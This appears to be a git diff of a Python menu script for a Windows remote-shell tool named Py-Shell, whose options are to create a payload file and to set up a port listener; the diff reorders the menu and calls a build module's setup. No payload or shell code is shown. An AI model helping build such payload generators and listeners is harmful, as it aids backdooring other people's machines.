@@ -1,10 +1,8 @@
 #Windows 10
 import os
 import time
-import requests
 import server
 import build
-import socket
 global homescreen
 homescreen = """
  ██▓███ ▓██   ██▓  ██████  ██░ ██ ▓█████  ██▓     ██▓    
@@ -41,6 +39,8 @@ def main():
 
 
 def startup():
+    global direct
+    direct = str(os.getcwd())
     try:
         os.chdir("C:/")
         os.mkdir("Py-Shell-Files")
@@ -59,11 +59,11 @@ def options():
         os.system("cls")
         print(homescreen)
         try:
-            choice = int(input("[1] Setup port listener\n[2] Create payload file\n\n[?] Choose an option: "))
-            if choice == 1:
+            choice = int(input("[1] Create payload file\n[2] Setup port listener\n\n[?] Choose an option: "))
+            if choice == 2:
                 listener_choice = True
                 break
-            elif choice == 2:
+            elif choice == 1:
                 payload_choice = True
                 break
         except Exception as e:
@@ -76,7 +76,8 @@ def action():
 
 
     elif payload_choice == True:
-        build()
+        os.chdir(direct)
+        build.setup()
 
     else:
         wait = input("A choice error occurred")
